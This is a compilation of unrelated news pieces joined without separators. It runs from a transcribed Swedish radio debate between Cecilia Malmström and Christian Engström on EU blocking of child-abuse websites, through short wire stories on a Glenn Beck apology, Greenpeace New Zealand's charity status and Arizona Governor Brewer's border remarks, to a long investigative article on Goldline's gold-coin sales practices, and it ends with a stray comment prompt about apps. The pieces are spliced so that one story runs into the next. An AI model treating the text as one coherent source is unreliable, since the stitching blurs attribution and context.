[ 14:32 ] Reporter : With us from a studio in the EU Commission in Brussels is Cecilia Malmström , Sweden ’s EU Commissioner .
Welcome to the program . [ 14:39 ]
Malmström : Thank you .
[ 14:42 ]
Reporter :
Tell us about this law proposal that you have made about blocking child porn sites .
[ 14:49 ]
Malmström :
It is part of a bigger package to combat sexual abuse of children , so there are seveal propsals about punishments and harmonization , support for victims , treatment etc .
But this particular part is about the problem that there are so many child pornography sites around .
We are proposing that the member states should block them .
This can be done in various different ways .
One way is to do it like in Sweden .
This is a good solution that is also used in Norway , Denmark , The Netherlands , Great Britain .
Another way is to legislate .
This has been done in Italy and Finland , and is on its way in Belgium and France as well .
At the same time , the member states should of course also do what the policeman talked about , to try to close them down at the source , so to speak .
But they often have their web hotels in countries that are difficult to cooperate with , where we do n’t have this kind of agreements .
So we propose that we should do both , and that it is up to the member states do decide exactly how it should be done .
[ 15:47 ]
Reporter :
What do you think can be achieved with a law like this ?
[ 15:54 ]
Malmström : First , it sends an important signal that these are horrible pictures that are being produced .
Every time somebody looks at them the children are violated .
This is an assault on the most vulnerable individuals in our society .
Also , it is a way to always ” keep pushing ” to make it more and more difficult to access , to reduce demand .
Just like the policeman says here , it is a way to fight it .
It does n’t work one hundred percent , of course , but as the Swedish experience shows , it can be fairly effective .
[ 16:15 : ]
Reporter :
But you are saying that the Swedish voluntary system is good , but you would like to go further ?
[ 16:31 ]
Malmström : No , I ’m not saying that .
It is good that the member states close down .
We want the member states to block these sites .
This can be done in different ways .
It can be done like in Sweden and many other countries , or it can be done via legislation .
There are different techniques , and the Commission has no opinion on this .
The sites should be blocked and closed down .
[ 16:52 ]
Reporter : But 15 % of Sweden is not covered by the voluntary agreement .
[ 16:58 ]
Malmström : Yes , but that means that 85 % is , so we get quite a few in this way .
[ 17:02 ]
Reporter : Let ’s welcome Christian Engström , Member of the European Parliament for The Pirate Party , who is with us from another studio in Brussels . [ 17:10 ]
Reporter :
You say that this proposal is censorship .
How do you mean ? [ 17:14 ]
Engström : Yes , it is censorship .
It ’s about blocking certain sites , so it ’s censorship .
And that ’s what ’s so worrying about this proposal .
Of course nobody likes pictures of child abuse , that ’s completely uncontroversial .
Everybody is against it , and it ’s illegal in all countries .
To the extent that this kind of pictures are openly circulated on the net , it is very , very uncommon , simply because it is illegal in all countries , and most people find it revolting .
[ 17:40 ]
Reporter : Before we go on , how do you know that it is very , very uncommon ? [ 17:47 ]
Engström : Because I know a lot of pirates who are very good at finding things on the Internet .
They all say the same thing :
There is n’t a lot of child pornography openly available .
I ’m sure it happens that child pornography is exchanged , but this is done in closed circles .
If you ’re interested in child pornography it ’s hardly something you advertise on your own blog .
It ’s highly criminal in all countries , and there is a very low tolerance for it among basically all people .
[ 18:20 ]
Reporter :
But we heard the policeman from the Child Pornography Group say that there are 50,000 redirections per day .
That seems to indicate a certain level of interest .
[ 18:30 ]
Engström :
No , that indicates that the so called ” child pornography list ” contains other things than child pornography .
This is clear from what the policeman said later .
He says that most of the servers are in the US .
If it had been pictures of sexual abuse of children , that would have been as illegal in the US as it is in any European country .
If that was the case , the police would of course have taken them down .
But it is n’t that kind of sites .
[ 18:58 ]
Reporter :
So you mean that in practice this kind of blocking does not primarily hit child porn sites ? [ 19:10 ]
Engström : Exactly , child pornography is illegal everywhere , and virtually everybody finds it horrible .
If it is openly available it will be reported to the police .
The blocking list that the police has has been leaked , and when people have gone through the list , it turns out to be regular porn sites .
[ 19:31 ]
Reporter : Cecilia Malmström , what do you say ?
You are attacking regular porn sites that are not illegal , according to Christian Engström . [ 19:40 ]
Malmström : With all due respect for The Pirate Party and your members and followers , I ’m sure that you are not looking for child pornography sites .
There are a lot of child pornography sites out there on the net .
This is a big problem , according to the police in all EU member states , so it is not true that it is a marginal problem .
And even if it were only a few , it is a horrible assault on sometimes very young children .
To call it censorship to try to close that down is to misunderstand what censorship is .
Censorship is about opinions , freedom of speech .
There is no freedom of speech to distribute child pornography , there is no human right to watch it .
On the contrary , it ’s illegal to have such films and to have such books .
They should be shut down , sites like that on the net . [ 20:21 ] Reporter : Christian Engström ? [ 20:30 ]
Engström :
Yes , we are quite agree , in that case they should be shut down .
If there are sites that are openly distributing pictures of child abuse , then the sites should be shut down .
But what Cecilia Malmström is proposing is to just put a blanket over the problem to hide it . [ 20:47 ]
Reporter :
And what do you mean is the problem with a blanket ? [ 20:50 ]
Engström :
If there are this kind of pictures out in the open , then the police should of course close down the site , and find the people responsible for it and put them in prison .
I find it very strange when Cecilia Malmström is saying that it is difficult to cooperate with the US , I ca n’t understand that .
If this is true it is regrettable , but this is very sharp criticism she is directing at the United States , one of our major trade partners . [ 21:20 ]
Malmström : I did n’t say that !
You … [ 21:25 ]
Reporter : But Cecilia Malmström .
This sounds very simple according to Christian Engström . [ 21:29 ]
Malmström : Yes , but it is n’t .
I would n’t put forward this proposal if it was n’t a serious problem .
What we do in Sweden is that internet service providers block access , we have done it since 2005 .
It has been going on for five years , this thing that Christian Engström calls censorship .
Denmark , Norway , New Zealand , Great Britain , and The Netherlands also do it .
These are hardly countries that are known for trying to curb freedom of speech .
And it is a big problem .
The policeman mentioned 50,000 attempts .
It ’s possible that the numbers are a bit exaggerated , but I ’ve heard similar numbers from other countries .
And of course we should shut them down at the source .
We of course cooperate with the US , but it is a giant problem in the US that they ca n’t get them because they change web hotels several times a day .
They ’re in Ukraine , and the Ukrainian authorities have recently admitted the problem .
We cooperate with them too , but it ’s not always easy .
Many other web hotels are in rather peripheral countries that we have very little cooperation with , and then I ’m not talking about the US or Ukraine .
It ’s hard to shut them down , but of course we should do both these things in parallel , there is no conflict .
What we are proposing from the Commission is exactly what Sweden has been doing for five years .
No more than that , or if you want to solve it in some other way .
[ 22:42 ]
Engström :
But what the policeman said , and what has also become clear when this kind of lists have been leaked and people have analyzed them , is that most of the sites are in the US .
If we focus on them , perhaps things are n’t quite as simple as Cecilia Malmström claims .
Because if they had been illegal , they would have been illegal in the US as well .
[ 23:01 ]
Reporter : I would like to ask Cecilia Malmström :
You have faced the same criticism from the German government , which says it is far more effective to focus on shutting the pages down .
How do you respond to this criticism ? [ 23:18 ]
Malmström : No , I think we should do both .
We should shut down when we can , but this is a problem .
There are lots of studies showing this , and I ’ll be happy to send these to Christian Engström .
They show that the sites reappear several times a day on new hosting companies that are not accessible to the police .
So this is a very complex problem .
Yes , there has been som criticism in Germany , although we have received a lot of support from Germany as well .
And among virtually all the other member states there is large support .
All organizations that work with children , such as ECPAT and Save the Children , have also expressed firm support .
But it is true that there is criticism in Germany against this .
[ 23:48 ]
Reporter : Christian Engström , Cecilia Malmström said earlier that this law proposal is an important signal to show that this is wrong .
The children are violated again every time these pictures are distributed .
You say that this proposal is censorship , but what do you want to do instead ?
How should we tackle the basic problem ? [ 24:15 ]
Engström : Everybody is against child pornography being distributed .
[ 24:16 ]
Reporter : Yes , but you ’re a politician .
What should we do ? [ 24:17 ]
Engström :
What we should do is to close down the sites immediately .
And we can .
When it comes to so called ” phishing ” sites , that is , sites that pretend to be banks to trick people out of their account numbers etc. , they are closed down within four hours of being reported .
So it is possible to do things against criminal sites .
But what Cecilia Malmström is proposing is something different .
Since the US is n’t interested in sending the police at these sites , there is something not quite right in her reasoning .
The problem with block lists is that nobody has any control over what is added .
For a long time , the Swedish block list contained the site koreabonsai.com , which is a completely legitimate site about bonsai trees in Korea .
It is unclear how it came to be included in the list in the first place , but in any case it was .
They blocked the political site kopimi.com , which is a pirate related site that expresses certain political opinions , and in 2008 the were planning to block The Pirate Bay in this manner .
Censorship carried out in secret does n’t work . [ 25:22 ]
Reporter :
We ’ll end here .
Thank you Christian Engström , Pirate Party Member of the European Parliament , and Sweden ’s EU Commissioner Cecilia Malmström .
The debate has continued in the weeks that have passed since this radio program .
Ms. Malmström has written about the issue on her blog in Swedish , and has given an interview to the Swedish site Europaportalen , which has been translated into English by activists .
I have written several blog entries about the proposal .
So far most of them have been in Swedish , but I expect to be writing more about it in English in the future .
This is a matter that concerns all citizens of Europe .

WASHINGTON , May 29 ( UPI ) -- Right - wing radio host Glenn Beck has apologized for a fake conversation between U.S. President Barack Obama and one of his daughters .
Beck posted an apology on his Web site Friday a few hours after the dialogue aired , CNN reported .

" In discussing how President Obama uses children to shield himself from criticism , I broke my own rule about leaving kids out of political debates , " Beck said .
" The children of public figures should be left on the sidelines .
It was a stupid mistake and I apologize -- and as a dad I should have known better . "
Beck 's dialogue was inspired by a statement Obama made in a news conference Thursday on the BP oil spill in the Gulf of Mexico .
The president said his daughter Malia had asked him " Daddy , did you plug the hole yet ? "
On air , Beck and his colleagues had Malia asking the president questions like " Why do you hate black people so much ? "
There has been no reaction from the White House to Beck 's broadcast or apology , CNN said .
Greenpeace New Zealand is fighting to gain charitable status after it was turned down by the Charities Commission for advocating peace and indirectly encouraging illegal activity .
Greenpeace executive director Bunny McDiarmid said the environmental group had appealed against the commission 's decision to the High Court .
The case would be heard in August or September .
" We think it 's worthwhile challenging this decision , " she said .
" I think it 's an interesting debate that societies should have . . . around what is a charity and whether the law from 100 years ago is still relevant today . "
The rejection means Greenpeace could lose income tax exemption , which is granted only to registered charities .
People would still be able to make tax - free donations to the organisation .
Ms McDiarmid said Greenpeace still had income tax exemption pending a court decision , but losing the status was not why it was challenging the commission 's ruling .
" That does n't make much difference because we 're not a business . "
The commission 's decision in April found Greenpeace 's promotion of " disarmament and peace " was pushed in a political , rather than educational , way .
Greenpeace 's aim of international nuclear disarmament would require law changes in many countries , making it a political objective not appropriate for a charity .
Although Greenpeace did not directly advocate illegal acts , its advocacy of " non-violent direct action " had involved Greenpeace members acting illegally , the commission said .
One incident was cited in which 14 Greenpeace activists were arrested for illegally boarding a boat while protesting against the importation of palm kernels for stock feed .
The decision followed more than a year of dispute between the commission and Greenpeace , which tried to make changes to gain charitable status .
Greenpeace argued that its core purpose was charitable , pointing out that eliminating all weapons of mass destruction would have obvious community benefits .
Any " non-charitable " advocacy was incidental to its main charitable objectives of non-political environmental protection and education , Greenpeace said .
Charities Commission chief executive Trevor Garrett said organisations that dabbled in political advocacy but were primarily community - focused , such as Plunket , were safe .
But those with an overt political role were not charities .
The commission was set up in 2005 to rein in uncertainty over charitable status .
Previously , organisations had simply declared themselves charitable and reaped the tax benefits , providing they were not tax - audited .
( CNN ) --
A labor union representing nearly 20,000 border patrol agents and staff Friday disputed comments made by Arizona Gov. Jan Brewer that most illegal immigrants coming across the southern border are smuggling drugs .
Brewer initially made the comments earlier this month during a debate of Republican gubernatorial candidates .
She repeated them Friday when asked by a reporter for the basis of the claim .
" Well , we all know that the majority of the people that are coming to Arizona and trespassing are now becoming drug mules , " Brewer said .
" They 're coming across our borders in huge numbers .
The drug cartels have taken control of the immigration .
" So they are criminals .
They 're breaking the law when they are trespassing and they 're criminals when they pack the marijuana and the drugs on their backs . "
When pressed , Brewer explained that many are simply coming to the United States to look for work but " are accosted , and they become subjects of the drug cartels . "
T.J. Bonner of the National Border Patrol Council told CNN that Brewer 's claims were " clearly not the case . "
Bonner said that some undocumented immigrants caught by border patrol agents have drugs on them , and that they sometimes blame pressure from the drug cartels .
But , he said , those claims have little credibility because drug smugglers are typically transporting much larger quantities of drugs .
And besides , he said , if what Brewer said were true , there would be many more prosecutions for drug smuggling .
Brewer 's comments , Bonner said , do n't " comport with reality -- that 's the nicest way to put it . "
Brewer doubled down on the comments later Friday , however , issuing a statement reiterating them .
" The simple truth is that the majority of human smuggling in our state is under the direction of the drug cartels , which are by definition smuggling drugs , " Brewer 's statement said , according to the Associated Press as reported in the Arizona Republic .
" It is common knowledge that Mexican drug cartels have merged human smuggling with drug trafficking . "
Brewer said the " human rights violations that have taken place ( by the cartels ) victimizing immigrants and their families are abhorrent . "
Brewer 's statement is the center of a controversy over a recently passed law that requires law enforcement officials to ascertain the citizenship of the subject of any investigation if they have reason to believe their suspect is in this country illegally .

UPDATE : On Nov. 1 , 2011 , Goldline executives were charged with fraud .
Read on to learn why .
And check out our other reporting : Consumers tip off the FTC about Goldline , Beck ’s counterattack on Rep. Anthony Weiner , the story behind Goldline ’s perfect BBB rating , and the left - wing radio hosts who pitch gold .
TUNE IN TO GLENN BECK’S Fox News show or his syndicated radio program , and you ’ll soon learn about the precarious state of the US dollar , a currency on the verge of collapse due to runaway government spending , a ballooning national debt , and imminent Zimbabwe - style hyperinflation .
To defend yourself against the coming financial holocaust , Beck explained on his radio show last November , you need to “ think like a German Jew in 1934 , maybe 1931 . ”
And that means thinking about buying some gold .
Conveniently , Beck made that suggestion as he was in the midst of interviewing his own “ gold guy , ” Mark Albarian , the president and CEO of Goldline International , a Santa Monica , California - based precious metals company that is a major sponsor of Beck ’s radio and cable shows .
In a seamless intertwining of anxiety and entrepreneurship , the two amicably debated whether we ’ve already hit “ peak gold ” or whether the price of gold , then at $ 1,100 an ounce , might yet hit the inflation - adjusted high of $ 2,200 it saw back in 1980 .
Beck speculated that gold could go as high as $ 2,500 an ounce :
“ I think people are running out of options on what , you know , could be worth something at all . ”
For more than a century , gold has held a special allure for conservatives .
Amid economic downswings and social upheaval , the precious metal has come to be seen as a moral and political statement as much as an investment .
Ever since the late 19th century , when the gold standard became the center of a ferocious debate about the country ’s financial future , gold has been mythologized as a bulwark against inflation , federal meddling , and the corrosive effects of progressivism .
( See “ Goldbug Variations , ” below . )
In the late 1970s , South African Krugerrands became a refuge from soaring interest rates and oil prices .
In the ’90s , militia groups fearful of big banks and the Federal Reserve hoarded gold .
And now , with the economy limping along and a black Democrat in the White House , gold mania has gone mainstream .
Gold prices hit a recent high last December and remained strong as the European debt crisis unfolded this spring .
John Paulson , the hedge - fund giant who made billions bundling and betting against Goldman Sachs subprime mortgage securities , has invested heavily in gold , even starting a new fund devoted solely to it .
A recent New York Times poll found that 1 in 20 self - identified Tea Party members had bought gold in the past year .
Cashing in on all this is a raft of entrepreneurs who have tapped into financial insecurity and fever dreams of impending tyranny .
Nearly every major conservative radio host , including Rush Limbaugh , Sean Hannity , Michael Savage , and Dr. Laura Schlessinger has advertised gold .
( See “ Full Metal Racket , ” page 30 . )
But none has done more to cheer on the new gold rush than Glenn Beck .
Beck , whose various media enterprises brought in $ 32 million last year , according to Forbes , has a particular interest in plugging gold .
Since 2008 , Goldline has been one of his most reliable sponsors .
Last year , after Beck called President Obama a racist , and advertisers bailed on his cable show ( see “ Lonesome at the Top “ ) , Goldline stuck by him .
And its loyalty appears to have paid off .
In an email , Goldline ’s executive vice president Scott Carter says that while its Beck sponsorship does n’t bring in the majority of its customers , it “ has improved sales , ” which exceed $ 500 million a year .
In turn , Beck has stood by Goldline .
Last year , he made a promo video in which he stated , “ This is a top - notch organization ” — a quote featured prominently on Goldline ’s website .
After the liberal watchdog Media Matters complained about Beck and Goldline ’s partnership , Beck posted a video on his site in which he unapologetically noted that he ’d started buying from Goldline long before it was his sponsor , back when gold was $ 300 an ounce .
Such coziness between spokesman and sponsor is not uncommon on talk radio , where hosts can be paid to personally recommend just about any product .
In fact , liberal hosts such as Ed Schultz and Thom Hartmann have advertised gold .
However , their pitches generally have lacked Beck ’s tone of apocalyptic urgency .
The feedback loop between Beck and Goldline is unusually powerful even for talk radio , and even more so by cable standards .
When he ’s not talking up Goldline , Beck still hypes gold as a way to weather the coming end of the world as we know it .
Last December , he stood in front of his famous chalkboard , where he ’d written “ Gold , God , Guns , ” and admonished viewers , “ The smart money is saying , ‘ Hunker down ! ' ”
The more worked up Beck gets , the more Goldline can employ his fears in pitching its products to his audience .
Yet in putting his seal of approval on Goldline , “ the people that I trust , ” Beck has gone beyond simply endorsing an advertiser .
He ’s recommending a company that promotes financial security but operates in a largely unregulated no - man ’s land , generating a pile of consumer complaints about misleading advertising , aggressive telemarketing , and overpriced products .
As this story went to press , Rep. Anthony Weiner ( D - N.Y. ) asked the Federal Trade Commission and the Securities and Exchange Commission to investigate Goldline for its “ predatory policies ” and accused the company and conservative pundits of working “ hand in hand to cheat consumers . ”
Beck and other on - air personalities “ who are shilling for Goldline , ” he said , “ are either the worst financial advisors around or knowingly lying to their loyal viewers . ”
JAMES RICHARDSON heard about Goldline on Beck ’s radio show late last year .
A disabled former trucker who lives in Tennessee , Richardson called the company with the intention of buying one - ounce gold bullion coins .
The purity of American bullion is guaranteed by the Treasury and its prices are transparent , because they ’re closely linked to the spot price of gold .
But when Richardson got on the phone with Goldline , he says , a sales rep pressured him into buying something entirely different : $ 10,000 worth of tiny , 20 - franc Swiss gold coins .
“ I paid them on a credit card the same day , did n’t have no brochures on them or nothing , ” he says .
“ They make it sound really good , like you ca n’t lose on them . ”
Richardson regretted the purchase almost as soon as he hung up .
“ I ’m not a coin collector , ” he says ruefully .
The $ 10,000 represented one - fifth of his entire savings , and after some research he realized that he had vastly overpaid for the francs .
The 34 coins he ’d ordered from Goldline were 90 percent gold , amounting to about 6.3 ounces of gold , which was then selling at around $ 950 an ounce .
He ’d paid the equivalent of around $ 1,600 an ounce , meaning it could be years before he recouped his investment — if ever .
“ It was just a lose - lose situation , ” he says .
Goldline ’s marketing and disclosure materials explain that customers buying coins “ for investment purposes ” may not be able recoup their costs .
They also say that first - time customers can cancel an order within seven days of purchase .
But Richardson says that when he tried to get his money back within that time period , salespeople gave him the runaround and insisted he should keep the coins because the price of gold was going to double .
He filed a complaint with the Los Angeles - area Better Business Bureau ( BBB ) , of which Goldline is a member , and eventually he got a refund .
Richardson suspects he ’s not the only Goldline customer who did n’t know what he was getting into .
“ I ai n’t got no college degree or nothing , but some of these older people think they ’re investing in gold , but you ’re not .
You ’re investing in coins , ” he says .
The price of gold increased 133 percent between early 2006 and this May , yet many Goldline customers say they have lost money on their purchases after discovering — as Richardson did — that they had badly overpaid .
Richardson is one of 44 people across the country who have filed complaints against Goldline with the Los Angeles BBB in the past three years ; customers have also have griped about their dealings with the company on message boards such as Ripoff Report and the Pissed Off Consumer .
Regulators in Missouri have sanctioned the company for pressuring an elderly couple to liquidate their other investments to buy overpriced coins .
The Federal Trade Commission ( FTC ) received 17 individual complaints about Goldline ’s sales tactics between early 2006 and this May , according to information obtained through the Freedom of Information Act .
Many of those stories mirror Richardson’s .
One customer , whose name was redacted , filed a complaint in February , writing , “ Not knowing anything about buying gold , I called Goldline International , Inc. because of their advertisement on Fox News and the fact that Glenn Beck endorses them . ”
Like Richardson , this customer originally wanted bullion , but the sales rep “ absolutely insisted ” on 20 - franc coins , and the customer relented .
Unable to get a refund , the customer reported paying $ 369 apiece for coins that could be bought elsewhere for as low as $ 208 .
A Washington state couple nearing retirement told the FTC they ’d invested $ 31,812 in foreign coins after calling to inquire about gold bullion “ as a hedge against the falling dollar . ”
Once they realized they ’d overpaid , they were too late for a refund .
Another customer complained that a sales rep “ insisted ” on selling coins , in this case French francs : “ He would not relent .
He told me lies . ”
A quadriplegic Californian described being persuaded to pay $ 5,000 for $ 3,000 worth of gold coins after disclosing a recent inheritance to a Goldline rep .
I wanted to ask Glenn Beck about these complaints .
He never responded , but after I sent his publicist some questions , I received a call from David Cosgrove , a former Missouri securities commissioner and lawyer who represents Goldline .
He explained that Goldline is a large operation with 200 salespeople .
A few problems , he said , are inevitable , but Goldline works hard to avoid them through compliance monitoring and other safeguards .
Undoubtedly , Beck fans who take his financial advice bear responsibility for not reading the fine print .
But their trust in the pitchman is an essential part of the symbiotic relationship between host and sponsor that is common on talk radio , where “ direct response ” advertisers carefully tailor their spots to complement the programming .
Toll - free numbers provide instant feedback on how well promotions are faring and allow companies to fine - tune their ad copy on a week - to - week basis .
If , for instance , an advertiser sees a surge in calls during a Beck segment focusing on currency collapse , it can play off of his program ’s message in an upcoming round of ads .
Take the Survival Seed Bank , another loyal Beck radio and TV advertiser , whose promotions echo both his and the gold companies ’ doomsaying .
A spot that ran on Beck ’s
Fox show earlier this year warned that “ the politicians and the bankers are going to bring the whole thing crashing down , ” making its vegetable seeds “ more valuable than even silver and gold . ”
The line between content and commercial is further blurred by guest appearances like the one Goldline CEO Albarian did with Beck last year .
Goldline says it does not require such appearances on the shows it sponsors ; a spokeswoman for Premier Radio Networks , which syndicates Beck ’s radio show , likewise says the host has invited Albarian on “ because he wants to .
It ’s not a contractual obligation . ”
Bob Leonard is the head of business development at Strategic Media , a firm that specializes in radio advertising .
He says talk radio is a great venue for direct - response advertising because its listeners are especially engaged with what they ’re hearing .
It ’s not a stretch for them to pick up the phone and dial a company like Goldline because , “ If you have someone like Glenn Beck saying , ‘ You gotta call these guys , ’ they ’re gonna call . ”
BECK OFTEN SAYS that when he buys gold , he sticks with collectors ’ coins instead of bullion because the government is less likely to confiscate them .
Like many Americans , you are probably unaware that the Obama administration is plotting to raid your safe - deposit box and melt down your bullion .
But Beck insists that we must be on guard against such a scenario , citing a Depression - era executive order that made all gold federal property .
In his Goldline promo video , Beck explains , “ Back in 1933 , FDR said , ‘ Okay , we ’re going to take all your gold , and [ slipping into a Muppet voice ] gee , it ’s worth — $ 8 an ounce . ' ”
Beck suggests that some folks “ got smart ” and claimed their antique coins could n’t be melted down because they were , well , antiques , and presto !
They got to keep their gold .
It ’s a message Beck has hammered home in other Goldline spots — that in the face of an “ out of control ” government , collector coins are a safer deal than other kinds of gold .
Of course , this is revisionist history .
With Congressional authorization , Roosevelt did indeed sign a 1933 executive order that made most private gold ownership illegal , but G - men did n’t go door to door seizing bullion .
Instead , the government offered gold owners almost $ 21 an ounce — the market rate ( and not $ 8 , as Beck claims ) to turn in their gold voluntarily .
Antique and foreign coins were exempt .
The move was intended to combat deflation by getting people to stop hoarding wealth that could instead circulate in the economy .
The government also temporarily suspended the gold standard so it could adjust the value of the dollar , stabilizing prices , helping debtors , and encouraging more production .
Georgetown University history professor Michael Kazin says FDR ’s gold policy , which was championed by populists , boosted the economy and in turn contributed to his landslide reelection in 1936 .
Goldline has not let the facts get in the way of using the confiscation myth for marketing .
As early as 2002 , its website ( which then featured an endorsement from Charlton Heston ) trumpeted how “ the events of the 1930s … prove how important owning scarce and desirable gold coins really is ! ”
Its current website and “ investor kit ” both provide a copy of FDR ’s 1933 order , noting that in its wake , gold ’s value increased nearly 75 percent — all the more reason to buy coins and hope for the worst .
The pitch seems to be working :
Its website reports that European gold coins are “ the most popular choice among Goldline clients . ”
What Goldline does n’t say in its promotional materials is that for its own bottom line , collector coins are a lot more lucrative than mere bullion .
Profits in the coin business are based on “ spread , ” the difference between the price at which a coin is sold and the price at which the dealer will buy it back .
Most coin dealers , including Goldline , will sell a one - ounce bullion coin for about 5 percent more than they ’ll buy it back for , a figure that closely tracks the price of an ounce of gold on the commodities markets .
That 5 percent spread does n’t leave a lot of room for profits , much less running dozens of ads a week on national radio and cable programs , with endorsements by everyone from Beck to Mike Huckabee , Fred Thompson , and Dennis Miller .
So , Goldline rewards its salespeople for persuading would - be bullion buyers to purchase something with a bigger markup .
Twenty - franc
Swiss coins are a little smaller than a nickel and contain a little less than two - tenths of an ounce of gold .
The coins are about 60 to 110 years old and not especially hard to find ( though Goldline describes them as “ rare ” ) .
They are not fully considered collectors ’ items or commodities , making their value more subjective than bullion ’s .
Goldline sets a 30 to 35 percent “ spread ” on the coins , meaning that it will pay $ 375 to buy back coins it ’s currently selling for $ 500 .
At that rate , gold prices would have to jump by a third just for customers to recoup their investment , never mind making a profit .
Investing in Goldline ’s 20 - franc coins would be like buying a blue - chip stock that lost a third of its value the minute it was purchased .
It ’s difficult to think of any other investment that loses so much value almost instantly .
So what persuades people to buy anyway ?
Beck has assured fans that Goldline ’s sales reps are “ not going to pressure you . ” I called to find out .
I dialed the company ’s toll - free number from my office to request one of its free “ investor kits . ”
When I mentioned that I ’d heard about Goldline from Glenn Beck , the salesman informed me right away that Beck was one of the company ’s best clients .
“ We ’re the only company he buys from , ” he told me .
After learning that I had never invested in gold before , he plugged “ investment grade ” coins by assuring me , “ That ’s what Glenn buys . ”
He also cited FDR ’s gold order .
It “ all has to do with the devaluation of the dollar , ” he said , warning , “ It ’s very similar to 1933 today . ”
He quickly ran through some disclaimers , like the spread and how the company recommends holding on to the coins for at least three to five years — preferably ten .
But in the end , he told me , gold is just a great investment .
“ Are you ready to get started today ? ” he asked .
“ Nobody can take it away from you .
You ca n’t print more of it .
There is a finite amount of gold . ”
About two weeks later , after I ’d received my investor kit , the same sales rep called me at work , even though I ’d never given him my phone number .
Just to double check that Goldline was indeed using caller ID to track potential customers , I called one of its 800 numbers on my cell phone and asked about putting gold into an IRA .
I did n’t offer my name or number , but the same sales rep called me back not five minutes after I hung up .
GOLDLINE’S ASSERTIVE TACTICS also extend to its efforts to protect its image .
In response to the disgruntled consumers who have congregated on Ripoff Report , it has joined the site ’s “ Corporate Advocacy Business Remediation and Customer Satisfaction Program , ” which has allowed it to bury the negative comments .
Its own customer review site , goldlinereviews.com , features only positive feedback .
“ I am writing to you about my account manager , ” writes Y.L.C. from California .
“ He is the very definition of a caring and polite professional , he is in fact the main reason I chose Goldline ( and Glenn Beck ) . ”
Goldline has also tried to keep unhappy customers from making their stories public .
Take John Quirindongo , a 77 - year - old former New York City postal supervisor .
Quirindongo has spent nearly four years trying to get compensation for the money he believes he lost trying to buy platinum bullion from Goldline .
When I visited him in Fort Lauderdale , Florida , he was reclining on a sofa , laptop open .
A box with two rolls of gold coins sat on a table .
His much younger Russian wife flitted around , pouring syrup on a blintz for me before darting off to her job at a children ’s clothes store .
Quirindongo ’s vision is mostly gone .
He relies on a walker to get around and a nebulizer to breathe .
His hearing is going , he ’s missing a couple of bottom teeth , and he gets a little confused sometimes .
But when it comes to Goldline , he ’s lucid — and very angry .
Quirindongo ’s saga started in 2006 , when a mortgage broker talked him into taking out a $ 100,000 subprime loan on his condo , which he owned outright .
After paying off his car and some bills , Quirindongo decided to invest $ 70,000 in platinum .
He called Goldline and ordered 54 one - ounce platinum American Eagle bullion coins .
After the company received his wire transfer but before the sale was confirmed , a salesman called , telling him he needed to “ diversify ” his portfolio and pushing him to transfer $ 34,000 into Swiss 20 - franc gold coins .
Even though Goldline ’s disclosure materials do mention that its sales reps may call to “ discuss other products which carry a higher spread such as the European gold francs ” before an order is finalized , Quirindongo was caught off guard .
He says he argued that platinum was a better investment , but eventually caved and bought the francs .
Looking on eBay , Quirindongo found similar looking coins selling for far less .
He says he called to complain every day for a week , but the Goldline rep insisted he should let his coins gain value for 18 months .
Quirindongo missed the weeklong window for a refund and then spent the next year and a half letting his order appreciate .
But he was still mad , and in May 2007 , he sold the platinum part of his order back to Goldline , making about $ 219 , all of which was eaten up in commissions and storage fees .
The real shock came a few months later , when he tried to sell back his gold coins and discovered the buy - back price would leave him more than $ 10,000 in the hole .
After Quirindongo complained to the American Numismatic Association , of which Goldline is a member , the company offered a partial refund , so long as he signed an agreement promising not to speak publicly or contact any consumer or government agencies .
Quirindongo refused .
After he rejected a full refund , Goldline tried to close the matter by sending him his gold coins , which now sit partly unwrapped in his apartment .
Still bitter that he was talked out of his original platinum order , which would have appreciated significantly , Quirindongo has continued to bash Goldline .
He has posted long online tirades and is currently pursuing a RICO case ( an earlier federal suit he ’d filed on his own was tossed out ) .
Posting on Ripoff Report , a Goldline representative accused Quirindongo of trying to “ extort ” money from the company .
Quirindongo says he is fighting mainly for his wife Irina ’s sake :
His monthly postal - service pension will die with him , and her earnings wo n’t cover his mortgage and metals misadventures .
He worries she ’ll end up on the street .
“ I feel like a real chump now , ” he says .
“ The last few years have been absolute torture for me . ”
Quirindongo was n’t the only person I came across who ’d been offered a deal in exchange for keeping quiet .
California residents Peter Kim and Kyoung Park - Kim bought about $ 35,000 in 20 - franc coins from Goldline in 2007 after listening to the company ’s radio show , The American Advisor , which airs on more than 100 stations .
They complained about overpaying , and Goldline offered to refund most of their money if they ’d sign an agreement like the one offered to Quirindongo .
The couple refused and sold the coins on their own , losing between $ 1,000 and $ 2,000 .
“ At least we ’re young , so we can recoup some time and make money , ” says Kim .
“ But senior citizens , they do n’t have that luxury of recouping their investment . ”
( At press time , Goldline had not responded to a request for comment on Kim’s and other individual consumers ’ complaints . )
Goldline ’s unhappy customers have few options .
They ca n’t take the company to court , due to a mandatory arbitration clause in its contracts .
And even as it plays up fears of big government , Goldline neatly slips between the regulatory cracks .
While it describes its coins as investments , it ’s not licensed as an investment company .
Its salespeople are not licensed as securities brokers or investment advisors and therefore are beyond the reach of state or federal agencies charged with keeping brokers honest .
When Quirindongo complained to the FTC , Florida securities regulators , and the Department of Justice , he says , he got the same response : “ Everybody said , ‘ That ’s gold . ’
It ’s like stamp collecting .
It ’s unregulated . ”
“ Trading in coins has been an area that ’s very , very difficult for regulators to wrap their arms around , ” confirms Maine securities administrator Judith Shaw .
As the economy turned sour in 2008 , Shaw ’s office saw a large uptick in the aggressive telemarketing of gold , prompting her to issue a consumer advisory about “ potential scams and pitfalls ” being perpetrated by “ numerous shady companies operating on the margins of this industry . ”
There has been one successful state action against Goldline .
In 2006 , the children of an octogenarian Missouri woman complained to the state securities commissioner that Goldline had persuaded their mother to invest about $ 230,000 in gold coins and antique paper currency worth half as much .
The state determined that a Goldline salesperson had acted as an unlicensed investment advisor when he encouraged her to liquidate an annuity to buy coins .
Goldline agreed to refund $ 217,000 to the woman .
Cosgrove , who represented Goldline in the Missouri case , cautioned me not to see it as representative of the company as a whole .
He said the salesperson who prompted the complaints had already left the company by the time Goldline learned about the problem .
Beck has never acknowledged any of the complaints against Goldline , just as he ’s shrugged off concerns about his cozy relationship with the company .
If anything , his endorsement of Goldline has taken on a new edge of defiance .
Responding to Rep. Weiner ’s accusations in May , Beck accused him of McCarthyism and asked his fans to send in images of the congressman “ with a wiener nose . ”
As he railed against the “ assault on my advertisers and me ” on his radio program , he still managed to sneak in a plug , noting that he had 15 or 20 percent of his investments in gold — ” From Goldline .
Now , you tell me .
If I ’m such a scam artist , why would I be scamming myself ? ”

Let 's hear about your must - have apps ( whether we listed them or not ) in the comments .
